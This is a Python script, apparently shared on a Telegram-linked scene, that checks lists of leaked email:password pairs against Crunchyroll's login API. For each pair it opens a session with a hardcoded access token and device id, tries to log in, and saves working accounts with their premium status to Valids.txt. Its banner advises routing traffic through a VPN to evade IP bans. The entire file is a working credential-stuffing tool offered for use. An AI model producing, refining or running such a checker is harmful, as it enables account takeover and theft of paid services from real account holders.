import requests, time 
from colorama import Fore, init 
init() 
 
  
print(Fore.MAGENTA+'░█████╗░██████╗░██╗░░░██╗███╗░░██╗░█████╗░██╗░░██╗██╗░░░██╗██████╗░░█████╗░██╗░░░░░██╗░░░░░') 
print(Fore.MAGENTA+'██╔══██╗██╔══██╗██║░░░██║████╗░██║██╔══██╗██║░░██║╚██╗░██╔╝██╔══██╗██╔══██╗██║░░░░░██║░░░░░') 
print(Fore.MAGENTA+'██║░░╚═╝██████╔╝██║░░░██║██╔██╗██║██║░░╚═╝███████║░╚████╔╝░██████╔╝██║░░██║██║░░░░░██║░░░░░ ') 
print(Fore.MAGENTA+'██║░░██╗██╔══██╗██║░░░██║██║╚████║██║░░██╗██╔══██║░░╚██╔╝░░██╔══██╗██║░░██║██║░░░░░██║░░░░░') 
print(Fore.MAGENTA+'╚█████╔╝██║░░██║╚██████╔╝██║░╚███║╚█████╔╝██║░░██║░░░██║░░░██║░░██║╚█████╔╝███████╗███████╗') 
print(Fore.MAGENTA+'░╚════╝░╚═╝░░╚═╝░╚═════╝░╚═╝░░╚══╝░╚════╝░╚═╝░░╚═╝░░░╚═╝░░░╚═╝░░╚═╝░╚════╝░╚══════╝╚══════╝') 
print( '') 
  
print(Fore.YELLOW+'<------------------------------->') 
print('         By @OcTha_DroidXz       ') 
print(' Unete a mi canal https://t.me/SilverBulletO ') 
print('<------------------------------->') 
print("                                            ") 
print(' Notha: Utilisar vpn para no correr riesgo el baneo de ip.') 
print("Si se usa con nordvpn, no necesitará ningún proxy. Los servidores nordvpn alemanes funcionan mejor con él") 
  
 
 
 
def check(): 
    print("                                            ") 
    dataset_name = input("Combo: ") 
    print("                                            ") 
    try: 
        dataset = open(dataset_name, "r") 
    except: 
        print("file dosnt exist") 
     
    accs = dataset.readlines() 
    with open("Valids.txt", "w") as valids: 
        for acc in accs: 
            try: 
                email = acc.split(":")[0] 
                password = acc.split(":")[1].split("\n")[0] 
            except: 
                print("wrong file format") 
            session_url = "https://api.crunchyroll.com/start_session.0.json" 
            session_data = { 
                "version": "1.0", 
                "access_token": 'LNDJgOit5yaRIWN', 
                "device_type": "com.crunchyroll.windows.desktop", 
                "device_id": "AYS0igYFpmtb0h2RuJwvHPAhKK6RCYId" 
            } 
            res_session = requests.post(session_url, data=session_data) 
            checks = res_session.json() 
            if checks["error"]: 
                if checks["code"] == "bad_auth_params": 
                    print("param error") 
                    exit() 
                else: 
                    print("Error de api de sesión desconocida") 
                    exit() 
            else: 
                session_id = checks["data"]["session_id"] 
             
            login_url = "https://api.crunchyroll.com/login.0.json" 
            login_data = { 
                "account": email, 
                "password": password, 
                "session_id": session_id 
            } 
             
            login = requests.post(login_url, data=login_data) 
             
            if login.text.__contains__('<!DOCTYPE html>'): 
                print("cambia tu país de vpns ") 
            else: 
                try: 
                    info = login.json() 
                except: 
                    print("inicio de sesión api error") 
                    exit() 
                     
             
            if info["error"]: 
                print(Fore.RED+"\tBad Account") 
                print(f'{email}:{password} >>>> Checker By: @OcTha_DroidXz'), 
                pass 
            else: 
                premium = info["data"]["user"]["premium"] 
                if premium: 
                    valids.write(f"{email}:{password} premium: true"), 
                    print(Fore.GREEN+"\tPremium Account") 
                    print(f'{email}:{password} >>>>> Checker By: @OcTha_DroidXz'), 
                else: 
                    valids.write(f"{email}:{password} premium: false"), 
                    print(Fore.CYAN+"\tFree Account") 
                    print(f'{email}:{password} >>>> Checker By: @OcTha_DroidXz'), 
            time.sleep(2) 
        print("Las cuentas corrientes terminadas y las que funcionan se guardan en Valids.txt") 
            
            
                 
check() 
init()
